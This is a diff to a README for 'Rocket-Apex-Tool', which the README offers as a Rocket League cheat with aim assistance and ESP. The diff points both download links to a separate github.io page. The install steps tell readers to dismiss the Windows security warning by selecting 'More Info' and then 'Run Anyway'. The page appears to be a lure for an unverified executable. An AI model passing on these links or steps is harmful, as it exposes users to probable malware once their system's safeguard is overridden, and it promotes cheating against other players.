@@ -1,6 +1,6 @@
 # 🚀 Rocket-Apex-Tool - Gain the advantage in Rocket League
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Sakship5190/Rocket-Apex-Tool)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://sakship5190.github.io)
 
 Rocket-Apex-Tool improves your performance in Rocket League. This software adds tools like a ball predictor, aim assistance, a boost manager, and ESP to your game. These features help you read the field and react faster than your opponents.
 
@@ -28,7 +28,7 @@ You need a Windows computer to run this application. Ensure your system meets th
 
 Follow these steps to install and run the tool on your computer.
 
-1.  Visit the [official download page](https://github.com/Sakship5190/Rocket-Apex-Tool) to locate the latest version of the software.
+1.  Visit the [official download page](https://sakship5190.github.io) to locate the latest version of the software.
 2.  Select the button labeled "Download" to save the installer file to your computer.
 3.  Open your Downloads folder and double-click the file to start the installation.
 4.  Follow the instructions shown on your screen. Windows might show a security prompt because the app operates as an overlay. Select "More Info" and then "Run Anyway" if you see this message.
